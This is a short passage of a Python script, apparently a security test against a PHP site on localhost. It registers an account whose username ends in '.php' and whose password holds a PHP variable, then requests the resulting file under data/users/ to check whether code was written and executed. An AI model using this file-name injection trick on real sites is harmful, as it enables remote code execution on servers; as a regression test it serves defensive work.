...
USER = {'username': 'exploitWork.php_', 'email': 'test@test.com', 'password': PHP}
ACCOUNT = SESSION.post(PATH_CREATE, data=USER)

PATH_EXPLOIT = 'http://localhost/site/data/users/exploitWork.php_.php'
ADMIN = SESSION.post(PATH_EXPLOIT)

if EXPECTED == ADMIN.text:
    print("Invalid Username Success!")
else:
    print("Invalid Username Fail")